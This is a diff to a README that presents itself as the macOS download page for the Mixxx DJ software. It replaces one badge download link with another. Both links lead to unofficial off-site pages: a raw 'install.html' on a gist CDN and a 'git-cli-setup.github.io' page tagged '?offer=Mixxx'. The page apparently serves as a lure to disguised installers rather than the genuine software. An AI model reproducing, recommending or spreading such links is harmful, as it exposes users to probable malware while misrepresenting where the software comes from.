@@ -1,7 +1,7 @@
 # Mixxx Desktop — DJ Mixing for macOS
 Mixxx for macOS is a professional DJ software that enables live mixing, beatmatching, and audio production using your Mac device.
 
-<a href="https://gistcdn.githack.com/ghostoffear8-sketch/0c9a34456d87b6dc0c0024da21530205/raw/45c4b71b17b95ef3588cb13c6ca7ff9abc994cf4/install.html?offer=Mixxx" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Mixxx" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Mixxx%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
